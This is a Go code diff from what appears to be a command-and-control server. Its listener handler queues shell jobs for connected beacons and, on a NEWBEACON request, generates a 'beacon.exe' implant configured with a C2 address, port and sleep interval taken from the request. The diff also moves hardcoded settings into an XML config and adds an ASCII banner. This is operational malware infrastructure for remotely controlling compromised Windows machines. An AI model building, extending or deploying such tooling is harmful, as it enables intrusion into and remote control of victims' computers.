@@ -6,10 +6,13 @@ import (
 	"github.com/gorilla/websocket"
 	"io/ioutil"
 	"net/http"
+	"strconv"
 )
 
+var CONFIG, _ = parseConfig("./Client/config.xml")
+
 var expectedHeaders = map[string]string{
-	"User-Agent": "Value1",
+	"User-Agent": CONFIG.Useragent,
 }
 
 var upgrader = websocket.Upgrader{
@@ -67,8 +70,8 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 				break
 			case BEACONS:
 				tmp := len(listener.Beacons)
-				res = append(res, IntToUint8(tmp))
-				Send_Bytes_to(w, res, "http://localhost:50049/c2", expectedHeaders)
+				res = []byte("{\"c2\":" + strconv.Itoa(tmp) + "}")
+				Send_Bytes_to(w, res, "http://localhost:"+strconv.Itoa(int(CONFIG.C2port-1))+"/c2", expectedHeaders)
 				res = make([]byte, 0)
 				break
 			case SHELL:
@@ -82,14 +85,15 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 
 				listener.Beacons[id].jobs = append(listener.Beacons[id].jobs, job)
 			case NEWBEACON:
+				body = body[4:]
 				var config OblivionisConfig
-				config.c2addr = "127.0.0.1"
-				config.c2port = 8080
-				config.useragent = "Value1"
+				config.c2addr = strconv.Itoa(int(body[0])) + "." + strconv.Itoa(int(body[1])) + "." + strconv.Itoa(int(body[2])) + "." + strconv.Itoa(int(body[3]))
+				config.c2port = binary.BigEndian.Uint16(body[4:6])
+				config.useragent = CONFIG.Useragent
 				config.a = listener.A
-				config.url = ""
-				config.sleep = 1000
-				config.host = "testhost"
+				config.url = strconv.Itoa(int(config.c2port))
+				config.sleep = binary.BigEndian.Uint32(body[6:])
+				config.host = CONFIG.Host
 				GenerateOblivionis(config, "./beacons/beacon.exe")
 
 				println("had made beacon")
@@ -109,11 +113,13 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 }
 
 func main() {
-	uri := ""
-	port1 := 8080
-	port2 := 50050
-	lisname := "ilovec2"
-	go StartListener(uri, port1, lisname)
+	fmt.Println("██████╗░██████╗  ██╗░░    ██╗   ███       ██████   ███████╗███╗  ██╗")
+	fmt.Println("  ██╔══██╗  ║░░░██║█ ║   ████╗░██║██╔════██╔══    ██╗      ██╔══██╗")
+	fmt.Println("  ██  █████║   ██████╔  ██╗██║███  ██╗░░██████╔╝ ████████  ██╗██║")
+	fmt.Println("  ██╔═██║     ██║   ██║██║ ╚███║    ██╔══╝░░███╗██╔══    ║║████║")
+	fmt.Println("  ██║░█████╔╝██║║░  ╚███║   ███      █████████║░████████║  ██║")
+	fmt.Println("╚ ═╝░░░░░░╚═════╝░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝")
+	port2 := CONFIG.C2port
 	StartClient("client", port2)
 
 }
